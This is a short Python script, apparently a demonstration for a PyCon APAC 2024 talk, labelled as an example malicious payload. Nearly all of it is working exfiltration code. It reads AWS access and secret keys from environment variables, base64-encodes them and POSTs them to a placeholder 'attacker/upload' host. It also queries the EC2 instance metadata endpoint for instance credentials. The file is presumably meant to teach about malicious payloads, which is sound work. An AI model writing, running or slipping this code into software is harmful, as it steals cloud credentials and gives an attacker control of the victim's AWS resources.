# MalPython
# PyCon APAC 2024
#
# Example of Python code as payload
# Read the AWS credential and send to attacker-controlled server

from urllib import request, parse
import base64 
import json
import os 

# used to send request
def sendRequest(data):
    content = base64.b64encode(data)
    body = {"identity":"","content":content.decode()}
    req  = request.Request("https://attacker/upload", data=json.dumps(body).encode())
    resp = request.urlopen(req)
    return resp.read()

# get the environment variables
result={}
if os.environ.get("AWS_ACCESS_KEY_ID") is not None:
    result["access"] = os.environ.get("AWS_ACCESS_KEY_ID")
else:
    result["access"] = ""

if os.environ.get("AWS_SECRET_ACCESS_KEY") is not None:
    result["secret"] = os.environ.get("AWS_SECRET_ACCESS_KEY")
else:
    result["secret"] = ""
sendRequest(json.dumps(result).encode())

# or, if the instance request the instance metadata
req  = request.Request("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance")
resp = request.urlopen(req)
print(resp.read())